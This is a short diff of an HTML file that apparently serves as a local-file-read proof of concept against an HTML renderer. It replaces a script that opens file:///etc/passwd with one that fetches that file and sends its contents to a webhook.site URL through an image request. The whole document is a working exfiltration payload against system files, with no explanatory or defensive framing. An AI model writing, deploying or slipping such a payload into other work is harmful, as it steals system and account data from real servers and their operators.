@@ -1,8 +1,5 @@
-<!DOCTYPE html>
-<html>
-<body>
-  <script>
-    window.open("file:///etc/passwd")
-  </script>
-</body>
-</html>
+<script>
+  fetch('file:///etc/passwd')
+    .then(r => r.text())
+    .then(d => new Image().src='http://webhook.site/84a03765-23d9-4cd6-961b-e43af3653d6a?leak='+encodeURIComponent(d));
+</script>
